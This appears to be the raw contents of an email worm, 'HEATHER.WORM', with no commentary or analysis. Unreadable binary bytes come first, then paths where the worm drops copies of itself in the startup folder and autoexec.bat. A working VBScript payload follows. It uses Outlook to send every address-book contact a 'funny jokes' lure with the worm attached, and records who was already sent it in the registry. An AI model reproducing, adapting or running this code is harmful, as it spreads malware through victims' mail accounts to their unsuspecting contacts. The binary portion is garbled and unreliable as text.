�[�  ��!�=���!� �[�  �?�!�=��?�!�l �R �% �ô;�n�!r�[�  ���!��@���!�>�!��ôA�^�!�[�  �^�!��=��^�!�@� ��!�>�!ô[�  ��!��@���!�>�!Ó�@��q�!�@��^�!�@�ϺB�!�@����!�@�׺�!�@�����!�@����!�>�!� HEATHER.WORM  By icarus  DLL32.com c:\heather.com c:\windows\startm~1\programs\startup\win32.vbs c:\windows\desktop\Install.vbs c:\autoexec.bat .. On Error Resume Next
Module1()
sub Module1()
on error resume next
sendOut()
end sub
sub regEdit(regisKey,regisVal)
Set registryEdit = CreateObject("WScript.Shell")
registryedit.RegWrite regisKey,regisVal
end sub
sub sendOut()

On Error Resume Next
dim x,a,regv,ctrE,maleAd,regedit,b,regad,ctrL,randString,i
randString = "Check out these funny jokes! :)"
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")

set mapi=out.GetNameSpace("MAPI")
for ctrL=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrL)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1

end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrE=1 to a.AddressEntries.Count
maleAd=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&maleAd)
if (regad="") then
set male=out.CreateItem(0)

male.Recipients.Add(maleAd)
male.Subject = randString
male.Body = randString
male.Attachments.Add("c:\heather.com")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&maleAd,1,"REG_DWORD"

end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
Module1()
end sub 